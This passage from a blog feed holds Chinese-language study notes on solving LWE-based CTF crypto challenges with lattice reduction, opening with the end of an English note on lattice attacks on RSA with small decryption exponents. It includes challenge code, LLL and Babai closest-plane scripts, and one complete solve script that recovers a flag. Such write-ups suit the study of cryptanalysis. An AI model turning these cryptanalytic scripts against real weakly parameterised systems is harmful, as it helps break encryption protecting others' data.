Exponents</h3><p>Just like the last section(RSA in the presence of 2 Small Decryption Exponents), the Lattice is:<br>$$<br>L_3 =<br>\begin{pmatrix}<br>1&amp;-N&amp;0&amp;-N^2&amp;0&amp;0&amp;0&amp;-N^3\\<br>0&amp;e_1&amp;-e_1&amp;-e_1N&amp;-e_1&amp;0&amp;e_1N&amp;e_1N^{2}\\<br>0&amp;0&amp;e_2&amp;-e_2N&amp;0&amp;e_2N&amp;0&amp;e_2N^2\\<br>0&amp;0&amp;0&amp;e_1e_2&amp;0&amp;-e_1e_2&amp;-e_1e_2&amp;-e_1e_2N\\<br>0&amp;0&amp;0&amp;0&amp;e_3&amp;-e_3N&amp;-e_3N&amp;e_3N^2\\<br>0&amp;0&amp;0&amp;0&amp;0&amp;e_1e_3&amp;0&amp;-e_1e_3N\\<br>0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;e_2e_3&amp;e_2e_3N\\<br>0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;e_1e_2e_3\\<br>\end{pmatrix}<br>\cdot D<br>$$<br>where $D$ is:<br>$$<br>diag(N^{3 \over2},N,N^{({3\over 2})+\alpha_3},N^{1\over2},N^{({3\over2})+\alpha_3},N^{1+\alpha_3},N^{1+\alpha_3},1)<br>$$</p><h3 id="RSA-in-the-presence-of-4-Small-Decryption-Exponents"><a href="#RSA-in-the-presence-of-4-Small-Decryption-Exponents" class="headerlink" title="RSA in the presence of 4 Small Decryption Exponents"></a>RSA in the presence of 4 Small Decryption Exponents</h3><p>The matrix is too big…..</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#introduction&quot; class=&quot;headerlink&quot; title=&quot;introduction&quot;&gt;&lt;/a&gt;introduction&lt;/h2&gt;&lt;p&gt;the purpose of this paper is g</summary>
      
    
    
    
    <category term="Reading notes" scheme="http://tearsjin.github.io/categories/Reading-notes/"/>
    
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="Reading" scheme="http://tearsjin.github.io/tags/Reading/"/>
    
  </entry>
  
  <entry>
    <title>The learning of LWE</title>
    <link href="http://tearsjin.github.io/2021/03/11/The-learning-of-LWE/"/>
    <id>http://tearsjin.github.io/2021/03/11/The-learning-of-LWE/</id>
    <published>2021-03-11T10:56:47.000Z</published>
    <updated>2021-03-27T12:52:31.226Z</updated>
    
    <content type="html"><![CDATA[<p>做Ant&amp;d3的时候发现自己Lattice还不会, 所以就去学了一波Lattice, 顺便就了解了一下LWE, 发现这玩意居然有三次比赛用的都是同一个板子, 也每个都去做了分析了一下, 然后就集中在这里了.</p><blockquote><p>感谢一位大大大大大师傅详细的wp，我才能这么快的明白原理，指路 —&gt;  <a href="https://blog.soreatu.com/">https://blog.soreatu.com/</a></p></blockquote><h1 id="X-NUCA-Diamond"><a href="#X-NUCA-Diamond" class="headerlink" title="X-NUCA Diamond"></a>X-NUCA Diamond</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> sage.crypto.lwe <span class="keyword">import</span> LWE</span><br><span class="line"><span class="keyword">from</span> sage.stats.distributions.discrete_gaussian_integer <span class="keyword">import</span> DiscreteGaussianDistributionIntegerSampler <span class="keyword">as</span> DGDIS</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">assert</span> FLAG.startswith(<span class="string">b&quot;X-NUCA&#123;&quot;</span>) <span class="keyword">and</span> FLAG.endswith(<span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">A = random_matrix(ZZ, <span class="number">320</span>, <span class="number">5</span>, x = <span class="number">10</span>, y = <span class="number">1000</span>)</span><br><span class="line">B = Matrix(A * vector([randint(<span class="number">1</span>, <span class="number">2</span>^<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">L = LWE(n = <span class="number">25</span>, q = <span class="number">1000</span>, D = DGDIS(<span class="number">3</span>))</span><br><span class="line">S = [L() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">M = Matrix(<span class="number">64</span>, <span class="number">25</span>, [<span class="built_in">int</span>(i).__xor__(<span class="built_in">int</span>(j)) <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(A.<span class="built_in">list</span>(), (Matrix([x <span class="keyword">for</span> x, _ <span class="keyword">in</span> S])).<span class="built_in">list</span>())])</span><br><span class="line">T = Matrix([randint(<span class="number">1</span>, <span class="number">2</span>^<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)])</span><br><span class="line">R = T.transpose().stack(T * vector([y <span class="keyword">for</span> _, y <span class="keyword">in</span> S]).change_ring(ZZ))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">key = sha256(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, L._LWE__s))).encode()).digest()</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">ct = cipher.encrypt(FLAG)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(B.<span class="built_in">list</span>()).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(M.<span class="built_in">list</span>()).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(R.<span class="built_in">list</span>()).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">f.write((iv + ct).<span class="built_in">hex</span>().encode())</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h2 id="一些新见到的函数"><a href="#一些新见到的函数" class="headerlink" title="一些新见到的函数"></a>一些新见到的函数</h2><ol><li><p><code>random_matrix(ZZ, 5, 320, x = 10, y = 1000)</code>: 随机生成一个整数的$320 \cdot 5$矩阵, 其元素的取值范围是$[x,y)$也就是$[10,1000)$</p></li><li><p><code>LWE(n = 25, q = 1000, D = DGDIS(3))</code>: 生成一个25维 $mod \ 1000$的LWE对象</p><p><code>D</code> - an error distribution such as an instance of <code>DiscreteGaussianDistributionIntegerSampler</code></p></li><li><p><code>stack()</code>: 在末尾添加一行</p></li></ol><h2 id="题目中给出的一些条件"><a href="#题目中给出的一些条件" class="headerlink" title="题目中给出的一些条件"></a>题目中给出的一些条件</h2><ul><li>首先是一个<code>320*5</code>的矩阵$A$，乘上了一个随机变换矩阵<code>5*7</code>的矩阵$R$，得到了一个<code>320*7</code>的矩阵B</li><li>然后是一个LWE，生成了64组数据，$s⋅A_{lwe}+e=a$，没有直接给我们$A_{lwe}$和$a$。只给了$M=A{lwe}\bigoplus A$，以及用$s$作为AES的key，对flag进行了加密。</li><li>再就是一个knapsack problem，用长度为64的向量$a$与一个另外一个很大的长度为64的随机向量$T$相乘，得到一个很大的数$sum$。给了$T$以及$sum$。</li></ul><h2 id="knapsack-problem"><a href="#knapsack-problem" class="headerlink" title="knapsack problem"></a>knapsack problem</h2><p>这里有一个背包问题<br>$$<br>a_0T_0+a_1T_1+…+a_{63}T_{63} = sum<br>$$<br>其中已知$T_0,T_1,…,T_{63},sum$,而且$T_i$非常大, $a_i \le 1000$ , 可以由上述式子构造格子<br>$$<br>A=<br>\begin{pmatrix}<br>1&amp;0&amp;\cdots&amp;0&amp;T_0\\<br>0&amp;1&amp;\cdots&amp;0&amp;T_1\\<br>\vdots&amp;\vdots&amp;\ddots&amp;0&amp;\vdots\\<br>0&amp;0&amp;\cdots&amp;1&amp;T_{63}\\<br>0&amp;0&amp;\cdots&amp;0&amp;-sum<br>\end{pmatrix}<br>$$<br>则有<br>$$<br>\begin{pmatrix}<br>a_0,a_1,…,a_{63},{1}<br>\end{pmatrix}<br>\begin{pmatrix}<br>1&amp;0&amp;\cdots&amp;0&amp;T_0\\<br>0&amp;1&amp;\cdots&amp;0&amp;T_1\\<br>\vdots&amp;\vdots&amp;\ddots&amp;0&amp;\vdots\\<br>0&amp;0&amp;\cdots&amp;1&amp;T_{63}\\<br>0&amp;0&amp;\cdots&amp;0&amp;-sum<br>\end{pmatrix}<br>=<br>\begin{pmatrix}<br>a_0,a_1,…,a_{63},{0}<br>\end{pmatrix}<br>$$<br>可以看到$\begin{pmatrix}a_0,a_1,…,a_{63},0\end{pmatrix}$是其中一个格点, 而且非常的小, 可以尝试用LLL将其规约出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">R = [...]</span><br><span class="line">Lattice = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>):</span><br><span class="line">        <span class="keyword">if</span> i==j <span class="keyword">and</span> i!= <span class="number">64</span>:</span><br><span class="line">            Lattice[i][j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j== <span class="number">64</span>:</span><br><span class="line">            Lattice[i][j] = R[i]</span><br><span class="line">Lattice[<span class="number">64</span>][<span class="number">64</span>] = -Lattice[<span class="number">64</span>][<span class="number">64</span>]</span><br><span class="line">Lattice = Matrix(Lattice)</span><br><span class="line">a = Lattice.LLL()[<span class="number">0</span>][:-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># (868, 798, 863, 260, 206, 550, 326, 908, 49, 50, 273, 528, 584, 569, 975, 261, 885, 680, 116, 33, 677, 664, 922, 178, 999, 336, 60, 655, 102, 438, 269, 754, 988, 124, 10, 380, 589, 382, 668, 623, 335, 845, 104, 117, 961, 917, 114, 590, 255, 26, 81, 846, 925, 548, 446, 796, 543, 997, 492, 651, 485, 137, 701, 247)</span></span><br></pre></td></tr></table></figure><h2 id="恢复-A-lwe"><a href="#恢复-A-lwe" class="headerlink" title="恢复$A_{lwe}$"></a>恢复$A_{lwe}$</h2><p>这部分还有些不明白,先放着</p><h2 id="LWE"><a href="#LWE" class="headerlink" title="LWE"></a>LWE</h2><p>$$<br>s \cdot A + e = a<br>$$</p><p>可以将这个等式理解成$A$是一个格子, $s$是一个线性组合, 那么$b = s \cdot A$是一个格点, $e$是误差, $a = b+e$是一个非格点. LWE就是要找到这么离这个非格点最近的格点. 也就是CVP了</p><p>当$s$的长度不是很长的时候, 也就是说维度比较小的时候, 这个CVP还是可以解决的, 而这里$s$的长度是25, 观察一下LWE的式子.<br>$$<br>s_0A_{i,0}+s_1A_{i,1}+…+s_{24}A_{i,24} + e_i = a_i \ (mod \ p)<br>$$<br>熟悉的造格子前的套路, 将式子化为:<br>$$<br>s_0A_{i,0}+s_1A_{i,1}+…+s_{24}A_{i,24} + k_ip + e_i= a_i<br>$$<br>那么可以构造出等式:<br>$$<br>s \cdot L + e =<br>(s_0,s_1,…,s_{24},k_0,k_1,…,k_{39})<br>\begin{pmatrix}<br>A_{0,0}&amp;A_{1,0}&amp;\cdots&amp;A_{39,0}\\<br>A_{0,1}&amp;A_{1,1}&amp;\cdots&amp;A_{39,1}\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>A_{0,24}&amp;A_{1,24}&amp;\cdots&amp;A_{39,24}\\<br>p&amp;0&amp;\cdots&amp;0\\<br>0&amp;p&amp;\cdots&amp;0\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>0&amp;0&amp;\cdots&amp;p\\<br>\end{pmatrix}<br>+<br>(e_0,e_1,…,e_{39})<br>=<br>(c_0,c_1,…,c_{39})<br>$$<br>先对矩阵$L$进行规约, 得到一个good basis, 再用Babai’s algorithm求解CVP，即可得到离$a$最近的格点$b$。</p><p>最后解方程$A_{lwe} \cdot s = b^{T} (mod \ 1000)$</p><p>解出$s$这道题基本上就做完了</p><p>下面是Babai’s algorithm的板子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BabaisClosestPlaneAlgorithm</span>(<span class="params">L, w</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Yet another method to solve apprCVP, using a given good basis.</span></span><br><span class="line"><span class="string">    INPUT:</span></span><br><span class="line"><span class="string">    * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice.</span></span><br><span class="line"><span class="string">    * &quot;w&quot; -- a target vector to approach to.</span></span><br><span class="line"><span class="string">    OUTPUT:</span></span><br><span class="line"><span class="string">    * &quot;v&quot; -- a approximate closest vector.</span></span><br><span class="line"><span class="string">    Quoted from &quot;An Introduction to Mathematical Cryptography&quot;:</span></span><br><span class="line"><span class="string">    In both theory and practice, Babai&#x27;s closest plane algorithm</span></span><br><span class="line"><span class="string">    seems to yield better results than Babai&#x27;s closest vertex algorithm.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    G, _ = L.gram_schmidt()</span><br><span class="line">    t = w</span><br><span class="line">    i = L.nrows() - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">        w -= <span class="built_in">round</span>( (w*G[i]) / G[i].norm()^<span class="number">2</span> ) * L[i]</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> t - w</span><br></pre></td></tr></table></figure><p>总的exp就没写了, 具体的可以参照着下面两题来写, 反正都是一个板子的</p><h1 id="2020祥云杯-Easy-Matrix"><a href="#2020祥云杯-Easy-Matrix" class="headerlink" title="2020祥云杯 Easy Matrix"></a>2020祥云杯 Easy Matrix</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_offset</span>(<span class="params">size</span>):</span></span><br><span class="line">    x = np.random.normal(<span class="number">0</span>, <span class="number">4.7873</span>, size)</span><br><span class="line">    <span class="keyword">return</span> np.rint(x)</span><br><span class="line"></span><br><span class="line">secret = np.array(<span class="built_in">list</span>(flag))</span><br><span class="line"></span><br><span class="line">column = <span class="built_in">len</span>(<span class="built_in">list</span>(secret))</span><br><span class="line">row = <span class="number">128</span></span><br><span class="line">prime = <span class="number">2129</span></span><br><span class="line"></span><br><span class="line">matrix = np.random.randint(<span class="number">512</span>, size=(row, column))</span><br><span class="line">product = matrix.dot(secret) % prime</span><br><span class="line">offset = random_offset(size=row).astype(np.int64)</span><br><span class="line">result = (product + offset) % prime</span><br><span class="line"></span><br><span class="line">np.save(<span class="string">&quot;matrix.npy&quot;</span>, matrix)</span><br><span class="line">np.save(<span class="string">&quot;result.npy&quot;</span>, result)</span><br></pre></td></tr></table></figure><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>读取了matrix后就可以知道column = 42</p><p>将<code>flag</code>转成一个<code>1*42</code>的矩阵$secret$</p><p>来看看过程, 先是生成一个<code>42*128 </code>的随机矩阵$matrix$, 元素都$\leq 512$</p><p>然后计算$product = matrix \cdot secret \ (mod \ prime)$, 结果应该是一个$1*128$的矩阵</p><p>继续生成一个<code>1*128</code>随机矩阵$offset$</p><p>最后计算$result = (product + offset) \ (mod \ prime)$</p><p>题目给了$result$和$matrix$</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>来看一下加密的式子<br>$$<br>R = S \cdot M + e \ (mod \ p)<br>$$<br>显然是一个LWE, 现在已知的是$M$和$R$, 要求$S$, 将式子写具体<br>$$<br>R = (r_0,r_1,..,r_{127}) =<br>(s_0,s_1,…,s_{41})<br>\begin{pmatrix}<br>m_{0,0}&amp;m_{1,0}&amp;\cdots&amp;m_{127,0}\\<br>m_{0,1}&amp;m_{1,1}&amp;\cdots&amp;m_{127,1}\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>m_{0,41}&amp;m_{1,42}&amp;\cdots&amp;m_{127,41}<br>\end{pmatrix}<br>+<br>(e_0,e_1,…,e_{41})<br>(mod \ p)<br>$$<br>也就是说<br>$$<br>r_i = s_0m_{i,0} + s_1m_{i,1}+…+s_{41}m_{i,41} + e_i (mod \ p)<br>$$</p><p>老套路, 改写成等式有<br>$$<br>s_0m_{i,0} + s_1m_{i,1}+…+s_{41}m_{i,41} + e_i + k_ip = r_i \<br>s \cdot A + e = r<br>$$</p><p>解决LWE可以构造格子, 然后用LLL和babai’s nearest plane来解决, 下面就根据等式构造格子<br>$$<br>A=<br>\begin{pmatrix}<br>m_{0,0}&amp;m_{1,0}&amp;\cdots&amp;m_{127,0}\\<br>m_{0,1}&amp;m_{1,1}&amp;\cdots&amp;m_{127,1}\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>m_{0,41}&amp;m_{1,42}&amp;\cdots&amp;m_{127,41}\\<br>p&amp;0&amp;\cdots&amp;0\\<br>0&amp;p&amp;\cdots&amp;0\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>0&amp;0&amp;\cdots&amp;p<br>\end{pmatrix}<br>\begin{pmatrix}<br>p&amp;0&amp;\cdots&amp;0\\<br>0&amp;p&amp;\cdots&amp;0\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>0&amp;0&amp;\cdots&amp;p\\<br>m_{0,0}&amp;m_{1,0}&amp;\cdots&amp;m_{127,0}\\<br>m_{0,1}&amp;m_{1,1}&amp;\cdots&amp;m_{127,1}\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>m_{0,41}&amp;m_{1,42}&amp;\cdots&amp;m_{127,41}\\<br>\end{pmatrix}\\<br>$$</p><p>实际上做的时候右边的格子才有用, 左边的不行, 具体原因我也搞不清楚, 问了老师也没问出什么结果</p><p>然后就可以用LLL格约出good basis 再用babai’s nearest plane解CVP了</p><p>解出CVP也就意味着找到了$s \cdot A = b$中的$b$ , $A$又是已知的, 解方程即可</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BabaisClosestPlaneAlgorithm</span>(<span class="params">L, w</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Yet another method to solve apprCVP, using a given good basis.</span></span><br><span class="line"><span class="string">    INPUT:</span></span><br><span class="line"><span class="string">    * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice.</span></span><br><span class="line"><span class="string">    * &quot;w&quot; -- a target vector to approach to.</span></span><br><span class="line"><span class="string">    OUTPUT:</span></span><br><span class="line"><span class="string">    * &quot;v&quot; -- a approximate closest vector.</span></span><br><span class="line"><span class="string">    Quoted from &quot;An Introduction to Mathematical Cryptography&quot;:</span></span><br><span class="line"><span class="string">    In both theory and practice, Babai&#x27;s closest plane algorithm</span></span><br><span class="line"><span class="string">    seems to yield better results than Babai&#x27;s closest vertex algorithm.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    G, _ = L.gram_schmidt()</span><br><span class="line">    t = w</span><br><span class="line">    i = L.nrows() - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">        w -= <span class="built_in">round</span>( (w*G[i]) / G[i].norm()^<span class="number">2</span> ) * L[i]</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> t - w</span><br><span class="line">row = <span class="number">128</span></span><br><span class="line">col = <span class="number">42</span></span><br><span class="line">p = <span class="number">2129</span></span><br><span class="line"></span><br><span class="line">M = Matrix(<span class="built_in">list</span>(np.load(<span class="string">&#x27;matrix.npy&#x27;</span>)))</span><br><span class="line">R = vector(<span class="built_in">list</span>(np.load(<span class="string">&#x27;result.npy&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">A = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(row)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> i==j:</span><br><span class="line">            A[i][j] = p</span><br><span class="line">A = Matrix(A)</span><br><span class="line">L = Matrix(A.stack(M.transpose()))</span><br><span class="line">lattice = IntegerLattice(L, lll_reduce=<span class="literal">True</span>)</span><br><span class="line">closest_vector = BabaisClosestPlaneAlgorithm(lattice.reduced_basis, R)</span><br><span class="line"></span><br><span class="line">FLAG = Matrix(Zmod(p), M)</span><br><span class="line">flag = FLAG.solve_right(closest_vector)</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join( <span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br></pre></td></tr></table></figure><h1 id="2020纵横杯-babyLWE"><a href="#2020纵横杯-babyLWE" class="headerlink" title="2020纵横杯 babyLWE"></a>2020纵横杯 babyLWE</h1><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.crypto.lwe <span class="keyword">import</span> LWE</span><br><span class="line"><span class="keyword">from</span> sage.stats.distributions.discrete_gaussian_integer \</span><br><span class="line">    <span class="keyword">import</span> DiscreteGaussianDistributionIntegerSampler <span class="keyword">as</span> DGDIS</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">FLAG = FLAG.encode().replace(<span class="string">b&#x27;-&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> FLAG.startswith(<span class="string">b&#x27;flag&#123;&#x27;</span>) <span class="keyword">and</span> FLAG.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">s = <span class="built_in">list</span>(FLAG[<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(s)</span><br><span class="line">q = random_prime(<span class="number">1</span>&lt;&lt;<span class="number">512</span>, proof=<span class="literal">False</span>, lbound=<span class="number">1</span>&lt;&lt;<span class="number">511</span>)</span><br><span class="line"></span><br><span class="line">lwe = LWE(n=n, q=q, D=DGDIS(<span class="number">1</span>&lt;&lt;<span class="number">128</span>))</span><br><span class="line">lwe._LWE__s = vector(Zmod(q), s)</span><br><span class="line"></span><br><span class="line">L = [lwe() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;task.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    _ = f.write(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>\n&quot;</span>)</span><br><span class="line">    _ = f.write(<span class="string">f&quot;L = <span class="subst">&#123;L&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>太离谱了, 一个板子三个比赛用, 这题用的还是X-NUCA Diamond的LWE的板子…<br>但是为了充分理解(就是还没理解)LWE到底是怎么通过格子解出来的</p><p>先看看这题造的格子<br>加密的式子还是$s \cdot M + e = a \ (mod \ q)$, 这里的$s,M$长度32,一共64个式子<br>这里只知道$M$和$a$要求$s$, 思路都是记$s \cdot M = b $, $b$是格子$M$的一个格点, $a$是格外一个点, 通过对$M$规约找到$good \ basis$ 再利用最近平面算法解决一个CVP, 也就是找到离$a$最近的向量, 也就是$b$</p><p>把$s \cdot M = b \ (mod \ q)$再详细点就是<br>$$<br>s_0M_{i,0}+s_1M_{i,1}+…+s_{31}M_{i,31} = b_i + k_iq\\<br>s_0M_{i,0}+s_1M_{i,1}+…+s_{31}M_{i,31}+ k_iq = 